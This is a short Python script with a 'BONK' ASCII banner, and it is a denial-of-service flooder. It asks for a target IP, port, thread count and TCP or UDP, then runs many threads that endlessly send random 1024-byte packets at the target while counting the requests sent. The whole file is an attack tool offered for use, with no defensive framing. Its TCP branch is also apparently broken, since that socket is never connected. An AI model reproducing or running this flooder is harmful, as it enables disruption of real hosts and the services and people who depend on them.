import socket
import random 
import os
from threading import Thread


print("""

▄▄▄▄    ▒█████   ███▄    █  ██ ▄█▀
▓█████▄ ▒██▒  ██▒ ██ ▀█   █  ██▄█▒ 
▒██▒ ▄██▒██░  ██▒▓██  ▀█ ██▒▓███▄░ 
▒██░█▀  ▒██   ██░▓██▒  ▐▌██▒▓██ █▄ 
░▓█  ▀█▓░ ████▓▒░▒██░   ▓██░▒██▒ █▄
░▒▓███▀▒░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ▒ ▒▒ ▓▒
▒░▒   ░   ░ ▒ ▒░ ░ ░░   ░ ▒░░ ░▒ ▒░
 ░    ░ ░ ░ ░ ▒     ░   ░ ░ ░ ░░ ░ 
 ░          ░ ░           ░ ░  ░

""")
global requests
requests = 0
os.system("color red")
def attack():
    try:
        while True:
            global requests
            packet = random._urandom(1024)
            socket.sendto(packet,(host,int(port)))
            requests+=1
            print(f"Flooding {requests} request sent. CTRL + C to stop")
    except Exception as e:
        print (e)

host = str(input("Enter the ip address of the target: "))
port = int(input("Enter the port number of the target: "))
threads = int(input("Enter the numbers of concurrent processes you want: "))
contype = str(input("connection type tcp/udp: "))
if contype=="tcp" or  contype=="TCP":
    socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        for x in range (int(threads)):
            Thread(target=attack).start()
    except Exception as e:
        print(e)

elif contype=="udp" or contype=="UDP":
    socket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    try: 
        for x in range(int(threads)):
            Thread(target=attack).start()
    except Exception as e:
        print (e)